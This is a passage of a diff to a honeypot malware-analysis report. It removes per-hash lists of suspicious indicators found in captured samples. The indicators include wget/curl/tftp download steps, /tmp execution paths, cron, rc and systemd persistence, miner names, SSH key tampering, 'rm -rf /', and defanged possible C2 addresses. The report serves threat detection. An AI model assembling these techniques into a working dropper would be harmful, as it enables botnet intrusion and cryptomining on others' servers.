-| `tmpzo1rmb5x` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
 
 **Suspicious Indicators — HIGH Severity Samples:**
 
@@ -2108,748 +1443,22 @@ _`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1b
 - `Hardware recon` — `cat /proc/cpuinfo`
 - `IP:Port (possible C2)` — `198.144.179[.]82:80`
 
-_`20d4672f40c452d53b41227f669c481703677e302954c52158515f7003d2fb27` (20d4672f40c452d53b41227f...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`2ce942487b7c5cabed6f9a383133af635b8b10921c08f0ce518cad47df914af6` (2ce942487b7c5cabed6f9a38...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/.x_`
-- `chmod +x (make executable)` — `chmod +x`
-- `Hardware recon` — `cat /proc/cpuinfo`
-
-_`30e0cb05a8c207c4084adaeb2906cbb8119b3d638999a73d4635e333e09cc0f6` (30e0cb05a8c207c4084adaeb...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`378d2c4805956c99701a68bc06c815ca60cd73d0bf2c675a1090ecfea1aa5156` (378d2c4805956c99701a68bc...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`387d6d1bc5b00c60c64528c6b0ceb34fa7c4a83f6b8cf95f0526adb5cc57389d` (387d6d1bc5b00c60c64528c6...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `Download via ftpget` — `ftpget`
-- `Execution from /tmp` — `/tmp/condi`
-- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
-
-_`3e5586f6993bed97ae83472729a872385ddfde061e3c9eed7fbdeb401b738fde` (3e5586f6993bed97ae834727...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`3e724458a4b817aad81a70746f397fc4830da3ab02d465f53dcf8e6af9a8391e` (3e724458a4b817aad81a7074...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`3f17516cc8a591208afb7c49e156643dee6428a238b1d50a7be0443f4a866d24` (3f17516cc8a591208afb7c49...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/.g_`
-- `IP:Port (possible C2)` — `176.65.134[.]119:80`
-
-_`4079145398fad617557fdc44e63c49edbaeafb3744f1804aec0e430214e397b8` (4079145398fad617557fdc44...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`488cd4b95923b20587debbd1a747d9e04b85b3ff2b274e36660401e194576626` (488cd4b95923b20587debbd1...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`4c463687adab59995dc46225c0df38a12da6ffd828b1a46a162e75ba604897ad` (4c463687adab59995dc46225...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`5003d4cf1849fc207f3023b7220800f998cc34ec416ca3525f2707711258b98a` (5003d4cf1849fc207f3023b7...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`51caf63a51a28343a2766566ece2c8d83725de5000c5420ccf491bb5bf2ebe39` (51caf63a51a28343a2766566...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`586960df8bf559ffbba600f11917a99baed4a875cb7faa5eabc060bcde67277b` (586960df8bf559ffbba600f1...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`588390c5d2115707e120fd4286c61216ca80b02f33610669875083edf1671262` (588390c5d2115707e120fd42...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`591e135c571321fed659c2d5a763a4685333e2b1bccd35d19e51a1196878c01f` (591e135c571321fed659c2d5...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`5a85f6400740f096bfa7a7bf8ad7439a6c44dee83336701daca96b47c3e1472e` (5a85f6400740f096bfa7a7bf...)_
-- `Execution from /tmp` — `/tmp/.syslogd`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `Crypto miner binary` — `xmrig`
-
-_`5b73969e4df42bd57becfd96fdc5ce13873c48995a19a877bf3030e1399fbf2c` (5b73969e4df42bd57becfd96...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/.XXXXXXXX`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`60c3986439f423123eeb6e04e04dac447883863fe79dd8b664283cc4d20ec96d` (60c3986439f423123eeb6e04...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `IP:Port (possible C2)` — `239.255.255[.]250:1900`
-- `Botnet keyword` — `botnet`
-- `Crypto miner binary` — `xmrig`
-
-_`61aeef0d535d309f4bdda6278a7da4ef9d67674a46b619065b88171ee5c0f581` (61aeef0d535d309f4bdda627...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`62e3e86a7586174df485af5936639769971cfc62fd9d0f2d5385d5bfa61ea88c` (62e3e86a7586174df485af59...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
-- `Crypto miner binary` — `xmrig`
-
-_`67e823012241f46e78bf12ced9526ce9719ca21a0a4b3b4f52db62f16e5ec557` (67e823012241f46e78bf12ce...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`6980031c9f60b74691308715d5fa94fe6265c86d6b2c9b9f41004f41c618dbe8` (6980031c9f60b74691308715...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/.kworker`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b` (6d1fe6ab3cd04ca5d1ab7903...)_
-- `Execution from /tmp` — `/tmp/ktx`
-- `chmod +x (make executable)` — `chmod +x`
-- `Base64 decode (obfuscation)` — `base64 -d`
-- `RC script persistence` — `/etc/rc.`
-- `SSH key manipulation` — `.ssh/authorized_keys`
-- `System recon (uname)` — `uname -a`
-- `IRC PRIVMSG (C2 comms)` — `PRIVMSG`
-- `Crypto miner binary` — `minerd`
-- `Destructive rm -rf /` — `rm -rf /`
-
-_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-- `IP:Port (possible C2)` — `51.158.248[.]122:8517`
-
-_`732e796d24da151af2e4ad54d5706248aefe86686f83e5033c7ca8dd19e97954` (732e796d24da151af2e4ad54...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`73695282607747038a31f516e3f8310a67ae6f2f9e4a0b90b55a40f77272e559` (73695282607747038a31f516...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`773dbd8af231023be6f8d9183e5dcafe78a57550b3050eee11b61d73e82a61d9` (773dbd8af231023be6f8d918...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-- `Destructive rm -rf /` — `rm -rf /`
-
-_`7766739193c449206ea63751d23551e2057e4de80f6befaeb7a24eaeb63a5ee1` (7766739193c449206ea63751...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`79e51db148418ed38457312972f4d2d61773da0d4cb4697cf40a548567630ff7` (79e51db148418ed384573129...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`7a208815a33bd0cdd8c17129108e55bf1a49e8a57846bc53135759bd045bf9e0` (7a208815a33bd0cdd8c17129...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `Download via ftpget` — `ftpget`
-- `Execution from /tmp` — `/tmp/condi`
-- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
-
-_`7b1cbba56bb80e185cdf2097f5716c31d7e0f88f28ad7220b3b5a2cf73859ec8` (7b1cbba56bb80e185cdf2097...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`7e76874a7c3612f333e1dfb68a9d35c111b5f138df4941f7a6005d6c1ebb83bc` (7e76874a7c3612f333e1dfb6...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-
-_`7fd2bd41e693e49cd09260d85864709cc8066f9681b3c2014d9241f128694915` (7fd2bd41e693e49cd09260d8...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `IP:Port (possible C2)` — `94.154.43[.]231:3001`
-
-_`806c1a4193780bbdfdc3db8606747edf12cdc16e8b38e318ed86928c5ce95457` (806c1a4193780bbdfdc3db86...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-- `Systemd persistence` — `systemctl enable`
-
-_`80ef3c6e9929ca834a0a4b5ce2f833689a69e32f3748083e215e24dbc72831f1` (80ef3c6e9929ca834a0a4b5c...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`81760addaf68ddd3c15a24e180a2991f6fb4ab330a1650e0a363760cd0c36560` (81760addaf68ddd3c15a24e1...)_
-- `Download via wget` — `wget`
-- `Execution from /tmp` — `/tmp/.sshd`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `IP:Port (possible C2)` — `91.199.133[.]133:8080`
-
-_`885eedb41d5008249366afbedb69879cb793555ed0594b9bfa7f61f0cecfb0c6` (885eedb41d5008249366afbe...)_
-- `Execution from /tmp` — `/tmp/.X11-unix`
-- `Cron persistence` — `crontab`
-- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
-
-_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `Download via ftpget` — `ftpget`
-- `Execution from /tmp` — `/tmp/condi`
-- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
-
-_`8f96d5a5cd41a687f19e53ba7d9f2dc649227b9d27af957e55c480ea22cb30a3` (8f96d5a5cd41a687f19e53ba...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `chmod +x (make executable)` — `chmod +x`
-- `IP:Port (possible C2)` — `168.220.248[.]106:9087`
-
-_`93d5d6729dc0f5a37aef6763ad24ec250df1a7c91600441920ae30fabc9af85c` (93d5d6729dc0f5a37aef6763...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`941efe52eb858311653bf2c1e855555cf735896d500f11ea90aaf7e93d1faa3f` (941efe52eb858311653bf2c1...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`945afece38f108d7c1c5c71e785fbf452f7de803ca1f207e6eae1f9dd3d5ae80` (945afece38f108d7c1c5c71e...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`98792483aed3a9e0105cdaca1d5208916c07c45e0c46229e221a753fe3db0d30` (98792483aed3a9e0105cdaca...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`9c67e4693e9c4cbcc2daadb3a09722977c4b5f90c31c7a5815d8be4ba371dc3f` (9c67e4693e9c4cbcc2daadb3...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/browser`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`a48c84f1ce12eecb900ffee1e4c62338986eb771c873e58799fb4b3c3be7e26c` (a48c84f1ce12eecb900ffee1...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/.kworker`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`a68a4a508a26b77c50c15243812abfc34188cb2c2459fd97d8f0ff80277dbd02` (a68a4a508a26b77c50c15243...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`a9b88512ba552d7c5f283e2e1e070428b0f99db8c4c3b761a51aa2cb0af81015` (a9b88512ba552d7c5f283e2e...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`aa92fb3015e189bd59372a0fb43708d6127f936e7a4ede2c424d906023e0cfbe` (aa92fb3015e189bd59372a0f...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`b0215599b23e675722bc4fa164ddd1ae79d25fe38d3af14852798183425e8d30` (b0215599b23e675722bc4fa1...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` (b1633346a694467b99d9596f...)_
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-- `Systemd persistence` — `systemctl enable`
-
-_`b25c3c740aead577c7c89894e80ee57c63d5acd78e62d789213fda023bfbaf3c` (b25c3c740aead577c7c89894...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`b5497b2c9b6a0ea89688e018306536652081b57a916dba389fcb287703c17d86` (b5497b2c9b6a0ea89688e018...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`b694d9c69417fe8514f2ab80e7f73af18e0653ca774e4eb14c74a3775d69cc4a` (b694d9c69417fe8514f2ab80...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`b992e0488abed5c19f215626dee38cc4b7b92b918ab194e276924a462aa97c3f` (b992e0488abed5c19f215626...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` (bcc130d7635ef1ef7350d313...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`bcfbd1d0c98844ddd4795a6df4e6431a494a0320c72413f188b50140cd30f506` (bcfbd1d0c98844ddd4795a6d...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`bd065fb5504cd702dba8d6216d836617021e25be3002dc0bc8db43402ba7af55` (bd065fb5504cd702dba8d621...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`c0523063abe84c4064e3fad4f5503f9a7ea500420ddf909ef4ae1979da45cc15` (c0523063abe84c4064e3fad4...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bins.sh`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`c749b54ba8d032787dc4c990d63ceca1e43cdf49aed74775931ad3a73558cf0e` (c749b54ba8d032787dc4c990...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `Download via ftpget` — `ftpget`
-- `Execution from /tmp` — `/tmp/condi`
-- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
-
-_`c86da460d1d2ff18647ad8d99d08b029e69764f253a635f565d42c3f00555ee4` (c86da460d1d2ff18647ad8d9...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`cb1c3496202d7eb1803dc24fbecc332a245b52878084c1af23c2cca3ea52de09` (cb1c3496202d7eb1803dc24f...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`cc87390d87be2b8377ffe32df42d30c56b46c0293ae7a126f466140ad2c2577f` (cc87390d87be2b8377ffe32d...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`cd9655a77201f73e69953ec5b53f898de41983c1b4dcedd0c431955b9c20b241` (cd9655a77201f73e69953ec5...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` (d46555af1173d22f07c37ef9...)_
-- `Execution from /tmp` — `/tmp/clean_crontab`
-- `Base64 decode (obfuscation)` — `base64 -d`
-- `Cron persistence` — `crontab`
-
-_`d58ed4e7cf9ab3181cb59e18050cd9d4c41b334f0f07be08abe5bafed5c04069` (d58ed4e7cf9ab3181cb59e18...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`d59a4194ec66b508697d67d71b69f74f590e8a8bb346507075b3ded56854a374` (d59a4194ec66b508697d67d7...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`d6f225d1c58a1ea7b4ee54afe26607b8f5d93c5ee3092e5ea4271ac7cc606890` (d6f225d1c58a1ea7b4ee54af...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`daeb4dddaefa21f1e952b3a3e606f91d7c95955db3458730d30a0a218d005246` (daeb4dddaefa21f1e952b3a3...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`dc1d50597225317d5a9f93841f59c6f03ace0fbe217a23246c2e8be4841e49b8` (dc1d50597225317d5a9f9384...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `chmod +x (make executable)` — `chmod +x`
-- `IP:Port (possible C2)` — `168.220.248[.]106:9087`
-
-_`dcac02c71bd67e7ce708e2fad709059b817ebdde9796542ef16855de5c7b9a41` (dcac02c71bd67e7ce708e2fa...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.160[.]222:55487`
-
-_`e096bf51ba4bb7e4791166f7a35befb5a74b9ed2794f80ef7b913c6f16f7bd41` (e096bf51ba4bb7e4791166f7...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
